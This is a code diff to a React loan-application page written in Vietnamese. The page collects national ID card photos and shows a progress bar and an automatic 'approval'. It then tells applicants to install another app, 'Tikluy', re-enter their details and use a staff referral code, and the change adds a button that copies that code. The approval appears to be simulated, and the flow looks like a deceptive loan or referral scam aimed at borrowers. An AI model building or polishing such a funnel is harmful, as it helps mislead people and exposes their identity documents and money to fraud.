@@ -50,12 +50,15 @@
       const [isAnalyzing, setIsAnalyzing] = useState(false);
       const [analysisProgress, setAnalysisProgress] = useState(0);
       const [approvalResult, setApprovalResult] = useState(null);
+      
+      // Copy State
+      const [isCopied, setIsCopied] = useState(false);
 
       useEffect(() => {
         if (window.lucide) {
           window.lucide.createIcons();
         }
-      }, [currentStep, isAnalyzing, approvalResult, cccdFront, cccdBack]);
+      }, [currentStep, isAnalyzing, approvalResult, cccdFront, cccdBack, isCopied]);
 
       const handleInputChange = (e) => {
         const { name, value } = e.target;
@@ -79,6 +82,12 @@
 
       const formatVND = (num) => {
         return new Intl.NumberFormat('vi-VN', { style: 'currency', currency: 'VND' }).format(num);
+      };
+
+      const handleCopyCode = () => {
+        navigator.clipboard.writeText('0878665588');
+        setIsCopied(true);
+        setTimeout(() => setIsCopied(false), 2000);
       };
 
       const triggerAutoApproval = () => {
@@ -521,14 +530,29 @@
                         Hồ sơ đề xuất vay của Quý khách (<strong className="text-red-600 font-bold">{formatVND(approvalResult.amount)}</strong>) đã được ghi nhận trên hệ thống. Để tiếp tục quy trình xét duyệt và giải ngân tự động, xin vui lòng cài đặt ứng dụng <strong className="text-slate-900 font-bold">Tikluy</strong>, tiến hành <strong className="text-slate-900 font-bold">nhập lại thông tin</strong> và sử dụng mã giới thiệu bên dưới.
                       </p>
 
-                      {/* Khung mã giới thiệu kèm dòng lưu ý nhỏ bên dưới */}
+                      {/* Khung mã giới thiệu tích hợp Nút Sao Chép */}
                       <div className="space-y-2.5">
-                        <div className="bg-gradient-to-br from-slate-900 to-slate-950 text-white p-5 rounded-2xl space-y-1.5 shadow-xl border border-slate-800">
-                          <p className="text-xs text-slate-400 uppercase tracking-wider font-semibold">Mã giới thiệu nhân viên hỗ trợ:</p>
-                          <div className="text-4xl font-black text-red-500 tracking-widest font-mono py-1 drop-shadow">
-                            0878665588
+                        <div className="bg-gradient-to-br from-slate-900 to-slate-950 text-white p-5 rounded-2xl shadow-xl border border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-3">
+                          <div className="text-center sm:text-left">
+                            <p className="text-xs text-slate-400 uppercase tracking-wider font-semibold">Mã giới thiệu nhân viên hỗ trợ:</p>
+                            <div className="text-3xl font-black text-red-500 tracking-widest font-mono pt-1 drop-shadow">
+                              0878665588
+                            </div>
                           </div>
+                          
+                          <button
+                            onClick={handleCopyCode}
+                            className={`w-full sm:w-auto px-5 py-2.5 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-2 border ${
+                              isCopied
+                                ? 'bg-emerald-500 text-white border-emerald-400'
+                                : 'bg-white/10 hover:bg-white/20 text-white border-white/20'
+                            }`}
+                          >
+                            <i data-lucide={isCopied ? "check" : "copy"} className="w-4 h-4"></i>
+                            {isCopied ? "Đã sao chép!" : "Sao chép mã"}
+                          </button>
                         </div>
+
                         <p className="text-xs text-red-600 font-bold italic">
                           Lưu ý nhập mã giới thiệu của nhân viên để được duyệt nhanh chóng
                         </p>
